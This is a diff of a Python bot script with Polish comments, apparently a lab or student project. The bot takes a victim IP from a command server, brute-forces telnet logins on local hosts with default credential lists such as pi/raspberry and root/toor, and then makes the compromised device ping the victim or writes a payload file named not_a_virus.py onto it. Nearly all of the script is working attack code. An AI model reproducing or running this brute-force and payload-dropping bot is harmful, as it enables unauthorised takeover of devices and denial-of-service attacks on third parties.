@@ -1,8 +1,6 @@
 import socket
 import time
 import telnetlib
-# przekazac kopię
-# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co
 from _thread import start_new_thread
 
 attack = False
@@ -10,15 +8,14 @@ attack = False
 
 def telnetConnect(ip_address, victimIP, attackType: int):
     # można zrobić pętlę do wczytywania user credentials z pliku
-    #users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
-    #passwords = ['Ciumcium', 'toor', 'admin', '1234', 'root', 'user', 'raspberry']
-    users = ['pi']
-    passwords = ['Ciumcium']
-    #print("telnet works")
+    users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
+    passwords = ['Ciumcium', 'toor', 'admin', 'root', 'user', 'raspberry']
+    attackType=2
+    ip_address="192.168.1.10"
     for user in users:
         print('connecting with login: ' + user)
         for password in passwords:
-            #time.sleep(10)
+            time.sleep(10)
             if not attack:
                 print("telnet return")
 
@@ -27,10 +24,9 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
             except:
                 # if ip_addres does not respond return
-                print(ip_address+" not responding")
                 return
 
-            print(' and passwd: ' + password)
+            # print(' and passwd: ' + password)
             try:
                 tn.read_until(b"login: ")
                 tn.write(user.encode('ascii') + b"\n")
@@ -42,10 +38,10 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 tn.close()
                 continue
 
+            print("attacktype= "+str(attackType))
             if attackType == 1:  # note
-                #print('pingujemy..')
-                tn.write(b"ping " + str(victimIP).encode('ascii') + b"\n")  # można zrobić wątki
-                #tn.write(b"ping 192.168.100.19 \n")
+                print('pingujemy..')
+                tn.write(b"ping 192.168.1.24\n")  # można zrobić wątki
                 if not attack:  # tu też
                     print("stopping attack")
                     return
@@ -60,7 +56,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
                 if not attack:  # zrobić wątek sprawdzający czy przerwac atatak thread()
                     # print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
-                    #tn.write(telnetlib.IP)  # chyba tak
+                    tn.write(telnetlib.IP)  # chyba tak
                     return
 
                 tn.write(b"exit\n")
@@ -72,15 +68,21 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 str1 = file.read()
                 str1.replace('1.1.1.1', victimIP)
                 str1.replace('111111', '10001')
-
-                print(tn.write(b"touch Not_A_VirusTCP.py"))
-                print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'Not_A_VirusTCP.py', encoding="ascii")))
-                print(tn.write(b"python Not_A_VirusTCP.py"))
                 file.close()
+                print("weszło: "+str1)
+                tn.write(b"touch not_a_virus.py\n")
+                tn.write(bytes('echo ' + '"' + str1 + '"' + '>>' + 'not_a_virus.py'+'\n', encoding="ascii"))
+                time.sleep(60)
+                #print(tn.read_all().decode('ascii'))
+                #print(tn.write(b"python Not_A_VirusTCP.py"))
+
                 if not attack:
                     print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
                     # tn.write(telnetlib.IP)  # chyba tak
                     return
+                print(tn.read_all().decode('ascii'))
+                tn.write(b"exit\n")
+                return
 
                     # tn.write(b"exit\n")
             tn.close()
@@ -94,23 +96,23 @@ def checkForOtherDevices(ip, victimIP):
     g = ip.split('.')[-1]
     ip = ip[:l - len(g)]
     print('connecting to telnet...')
-    #start_new_thread(telnetConnect, ("192.168.100.8", victimIP, 1))
-    while x < 20:
-        if not attack:
-            return
-        current_address = ip + str(x)
-        # próbuj połączyć z każdym przez telnet
-        print(current_address)
-        start_new_thread(telnetConnect, (current_address, victimIP, 1))
-        x += 1
+    start_new_thread(telnetConnect, ("192.168.1.10", victimIP, 2))
+    # while x < 254:
+    #     if not attack:
+    #         return
+    #     current_address = ip + str(x)
+    #     # próbuj połączyć z każdym przez telnet
+    #     # print(current_address)
+    #     start_new_thread(telnetConnect, (current_address, victimIP, 2))
+    #     x += 1
 
     print('finished')
 
 
 if __name__ == '__main__':
 
-    # HOST = '192.168.100.11'  # The server's hostname or IP address
-    HOST = '192.168.100.19'
+    #HOST = '192.168.100.11'  # The server's hostname or IP address
+    HOST = '127.0.0.1'
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -130,7 +132,7 @@ if __name__ == '__main__':
                     s.send('1'.encode())
                     connected = 1
                 except:
-                    print("couldn't connect to: " + HOST)
+                    print("couldn't connect to: "+HOST)
                     s.close()
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     connected = 0
@@ -143,9 +145,8 @@ if __name__ == '__main__':
                 if str(data) == '1':
                     victim_ip = str(s.recv(16).decode())
                     print('victim address:' + str(victim_ip))
-                    attack = True
                     checkForOtherDevices(HOST, victim_ip)
-
+                    attack = True
                 else:
                     print('something went wrong')
                 # todo:zrobić try zeby sie nie wywalilo
